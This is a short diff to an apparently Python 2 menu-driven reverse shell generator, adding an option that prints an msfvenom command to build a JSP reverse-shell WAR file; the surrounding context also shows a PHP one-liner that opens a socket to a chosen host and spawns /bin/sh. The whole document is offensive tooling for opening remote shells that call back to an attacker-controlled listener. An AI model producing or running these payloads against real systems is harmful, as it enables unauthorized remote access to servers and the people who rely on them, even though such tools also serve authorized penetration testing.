@@ -68,6 +68,7 @@ def menu1():
     print "28. Python Oneliner"
     print "29. PHP Oneliner"
     print "30. Edit pentestmonkey's php file"
+    print "31. java/jsp_shell_reverse_tcp WAR file"
     print "9. Back"
     print "0. Quit"
     choice = raw_input(" >>  ")
@@ -175,6 +176,11 @@ def php_oneliner():
 	shellcode = 'php -r \'$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'' % args
 	oneliner(shellcode)
 
+#PHP java/jsp_shell_reverse_tcp WAR 31
+def java_war():
+    shellcode = "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war -o shell.war" % args
+    oneliner(shellcode)
+
 # Other resources
 # http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
 
@@ -234,6 +240,7 @@ menu_actions = {
     '28': python_oneliner,
     '29': php_oneliner,
     '30': php_file_pentestmonkey,
+    '31': java_war,
     '9': back,
     '0': exit,
 }
